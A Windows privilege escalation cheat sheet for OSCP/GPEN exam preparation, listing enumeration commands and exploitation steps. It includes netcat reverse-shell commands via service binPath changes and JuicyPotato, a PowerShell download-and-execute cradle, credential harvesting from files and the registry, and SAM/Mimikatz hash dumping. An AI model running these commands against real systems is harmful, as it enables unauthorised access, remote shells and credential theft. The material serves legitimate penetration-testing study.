# Windows Privilege Escalation Cheat Sheet (OSCP / GPEN)

This cheat sheet provides a **systematic methodology for Windows privilege escalation** commonly encountered in **OSCP and GPEN exams**. The focus is on **enumeration first**, then identifying and exploiting misconfigurations.

Core methodology:

```
Enumerate → Identify Weakness → Exploit → Maintain Access
```

Privilege escalation on Windows is **primarily enumeration**.

---

# 1. Basic System Enumeration

## Current User

```powershell
whoami
whoami /priv
whoami /groups
whoami /all
```

Check if the user has interesting privileges:

```
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
```

---

## System Information

```powershell
systeminfo
hostname
ver
```

Check OS version:

```powershell
wmic os get caption,version,buildnumber
```

Search exploit database:

```bash
searchsploit windows <version>
```

---

# 2. User and Group Enumeration

List users:

```powershell
net user
net user <username>
```

List groups:

```powershell
net localgroup
```

Check group members:

```powershell
net localgroup administrators
```

Current user information:

```powershell
net user <username>
```

---

# 3. Network Enumeration

Check network configuration:

```powershell
ipconfig /all
route print
arp -a
```

Active connections:

```powershell
netstat -ano
```

---

# 4. Running Processes

Check running processes:

```powershell
tasklist
```

Detailed process info:

```powershell
wmic process list full
```

Look for:

```
services running as SYSTEM
custom applications
scripts
```

---

# 5. Installed Programs

List installed software:

```powershell
wmic product get name,version,vendor
```

Registry method:

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall
```

Check for vulnerable software versions.

---

# 6. Services Enumeration

List services:

```powershell
sc query
sc qc <service_name>
sc config <service_name> binPath="malicious.exe"
```

Detailed information:

```powershell
wmic service get name,displayname,pathname,startmode
```

Look for:

```
services running as SYSTEM
unquoted service paths
writable service executables
```

Create a reverse shell and service restart
```
for cmd: sc stop windowsscheduler
for cmd: sc start windowsscheduler
for powershell: sc.exe stop windowsscheduler
for powershell: sc.exe start windowsscheduler
```

---

# 7. Unquoted Service Path

Check services:

```powershell
wmic service get name,displayname,pathname,startmode
```

Example vulnerable path:

```
C:\Program Files\My Service\service.exe
```

Windows will attempt:

```
C:\Program.exe
C:\Program Files\My.exe
```

If writable → privilege escalation.

---

# 8. Weak Service Permissions (Writable Binary or Writable Binary Path)

Check service permissions:

### Writable Service Binary
```powershell
sc qc <service_name>
```

Check writable service binary:

```powershell
icacls "C:\path\to\service.exe"
```

If writable → replace executable.

### Writable Service Configuration

Check if we have privileges over that process. If so, you can change the binary path name.

```
Use accesschk64 (https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
.\accesschk64.exe /accepteula -uwcqv <service_name>
sc config <service_name> binPath="nc.exe <KALI_IP> <PORT> -e C:\Windows\system32\cmd.exe"
```

### Start the service

```
net start <daclsvc_service_name>
```

---

# 9. Scheduled Tasks

List scheduled tasks:

```powershell
schtasks /query /fo LIST /v
```

Look for:

```
tasks running as SYSTEM
writable scripts via icacls. For ex, icacls c:\tasks\schtask.bat
```

---

# 10. Registry Permissions

Check registry permissions:

```powershell
reg query HKLM
```

Check writable registry keys.

---

# 11. AlwaysInstallElevated

Check registry keys:

```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

If both values:

```
AlwaysInstallElevated = 1
```

Then install MSI as SYSTEM.

---

# 12. Stored Credentials

Check saved credentials:

```powershell
cmdkey /list
```

Use stored credentials:

```powershell
runas /savecred /user:administrator cmd
```

---

# 13. Credential Files

Search for credentials:

```powershell
findstr /si password *.txt *.xml *.config
```

Search system:

```powershell
dir /s *password*
```

---

# 14. Registry Credentials

Check registry:

```powershell
reg query HKLM /f password /t REG_SZ /s
```

---

# 15. Unattended Installation Files

Check for unattended files:

```powershell
dir C:\ /s /b | findstr unattended.xml
```

Common files:

```
unattend.xml
sysprep.xml
```

---

# 16. PowerShell History

Check history:

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

---

# 17. File Permissions

Check writable files:

```powershell
icacls C:\path\file
```

Check directories:

```powershell
accesschk.exe -uws "Everyone" *
```

---

# 18. Token Privileges

Check token privileges:

```powershell
whoami /priv
```

If present:

```
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

Use impersonation exploits (e.g., token impersonation techniques). \
SeImpersonatePrivilege -> PrintSpoofer64.exe and GodPotato

## Get JuicyPotato

Get the exe from: https://github.com/ohpe/juicy-potato/releases
Get the netcat exe from: https://github.com/int0x33/nc.exe/

```
.\JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Users\bruce\Desktop\nc64.exe 10.128.66.134 5555 -e cmd.exe" -t "*" -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
```

##  SeImpersonatePrivilege Exploit Cheat Sheet

| Windows Version                              | Recommended Exploit |
|---------------------------------------------|--------------------|
| Windows Server 2008 / 2012 / 2012 R2        | JuicyPotato        |
| Windows 10 (older builds)                   | JuicyPotato / RoguePotato |
| Windows 10 (newer builds)                   | PrintSpoofer       |
| Windows Server 2016 / 2019                  | PrintSpoofer       |
| Windows Server 2022 / fully patched systems | GodPotato          |

---

# 19. DLL Hijacking

Check for applications loading missing DLLs.

Use Process Monitor to identify:

```
NAME NOT FOUND
```

Place malicious DLL in writable directory.

---

# 20. PATH Variable Abuse

Check PATH:

```powershell
echo %PATH%
```

If writable directory exists earlier in PATH → place malicious executable.

---

# 21. Automatic Enumeration Tools

Useful tools:

```
winPEAS (https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
PowerUp (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
Seatbelt
SharpUp
https://github.com/itm4n/PrivescCheck
https://github.com/bitsadmin/wesng
Metasploit (multi/recon/local_exploit_suggester)
```

Example:

```powershell
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.114.88.43:8181/PowerUp.ps1'); Invoke-AllChecks"
```

---

# 22. Quick Enumeration Commands

Run immediately after obtaining a shell:

```powershell
whoami
whoami /priv
systeminfo
net user
net localgroup administrators
wmic service get name,displayname,pathname,startmode
schtasks /query /fo LIST /v
cmdkey /list
```

---

# 23. Important Locations to Inspect

Check these directories:

```
C:\Program Files
C:\Program Files (x86)
C:\Windows\System32
C:\Users
C:\Temp
```

Look for:

```
scripts
config files
passwords
```

---

# 24. Common PrivEsc Paths in Exams

Typical OSCP/GPEN privilege escalation vectors:

```
Unquoted service path
Weak service permissions
AlwaysInstallElevated
Writable scheduled tasks
Credential discovery
Token impersonation
DLL hijacking
```

---

# 25. Recommended Enumeration Workflow

```
1. Check user privileges
2. Check system information
3. Enumerate services
4. Check scheduled tasks
5. Check credentials
6. Check writable files
7. Check registry
8. Check installed software
```

---

# 26. Harvesting Passwords From Usual Spots

## Unattended Windows Installations

Look for files below
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

## CMD History
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Powershell History
```
Get-History
```

## IIS Configuration
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Retrieve Credentials from Software: PuTTY
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

---

# 27. Cross Compilation


```
sudo pacman -S mingw-w64-gcc
x86_64-w64-mingw32-g++ hello.c -static -o hello
i686-w64-mingw32-gcc hello.c -static -o hello
```

---

# 28. SAM Dump with SeBackupPrivilege

If a comprimised user has SeBackupPrivielege, the attacker can dump the SAM database used by the LSASS process.

```
reg save hklm\sam C:\Users\<username>\Desktop\SAM.hive
reg save hklm\system C:\Users\<username>\Desktop\SYSTEM.hive
```

If you have enough privilege, use Mimikatz to dump the hashes.

```
mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

---

# 29. Final Advice

Privilege escalation on Windows is usually **misconfiguration**, not exploitation.

Always ask:

```
What runs as SYSTEM?
What files can I modify?
What executes automatically?
```

The more thoroughly you enumerate, the faster you escalate privileges.

# 30. Additional Resources

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
https://github.com/gtworek/Priv2Admin
https://github.com/antonioCoco/RogueWinRM
https://jlajara.gitlab.io/Potatoes_Windows_Privesc
https://decoder.cloud/
https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
```
